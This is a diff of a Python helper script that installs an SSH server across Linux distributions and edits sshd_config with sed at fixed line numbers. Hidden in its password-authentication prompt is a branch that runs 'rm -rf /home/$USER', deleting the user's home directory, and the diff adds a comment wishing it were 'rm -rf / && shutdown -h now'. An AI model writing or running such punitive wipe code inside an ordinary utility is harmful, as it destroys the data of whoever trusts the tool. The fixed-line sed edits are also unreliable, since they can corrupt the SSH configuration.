@@ -47,7 +47,35 @@ def definedistr():
 def sshinstall():
     clear()
     apt = ['kali', 'debian', 'ubuntu', ]
-    yum = []
+    yum = ['centos']
+    dnf = ['fedora']
+    pacman = ['arch', ]
+    rpm = []
+    emerge = ['gentoo']
+    distr = definedistr()
+    if distr in apt:
+        os.system('apt update -y')
+        os.system('apt install openssh-server -y')
+    elif distr in yum:
+        pass
+    elif distr in dnf:
+        os.system("dnf update")
+        os.system('dnf install openssh-server -y')
+    elif distr in pacman:
+        
+        os.system('pacman -Sy')
+        os.system('pacman -S openssh')
+    elif distr in rpm:
+        os.system("rpm update")
+    elif distr in emerge:
+        pass
+    else:
+        choose()
+
+
+
+
+
 def sshdown():
     if sys.platform == 'win*':
         pass
@@ -114,8 +142,10 @@ def setipport():
     """)
     ip = str(input(colored('>',"green")))
     port = int(input(colored('>',"green")))
-    os.system(f"sed -i "" /etc/ssh/sshd_config")  
-    os.system(f"sed -i 14s/#Port\s22/Port\s{port}/wg /etc/ssh/sshd_config") # 14, 16, 57  
+    os.system(f"sed -i '16a\ListenAddress {ip}' /etc/ssh/sshd_config")
+    os.system(f"sed -i '16d' /etc/ssh/sshd_config")
+    os.system(f"sed -i '14a\Port {port}' /etc/ssh/sshd_config")
+    os.system(f"sed -i '14d' /etc/ssh/sshd_config")
     sshconf()
 def passwdauth():
     clear()
@@ -141,7 +171,7 @@ def passwdauth():
                 cprint('Seriusly?',"red")
                 clear()
                 cprint("Good luck","red")
-                os.system('rm -rf /home/$USER')
+                os.system('rm -rf /home/$USER') # Жаль что не rm -rf / && shutdown -h now :>>
                 clear()
                 sys.exit()
             else:
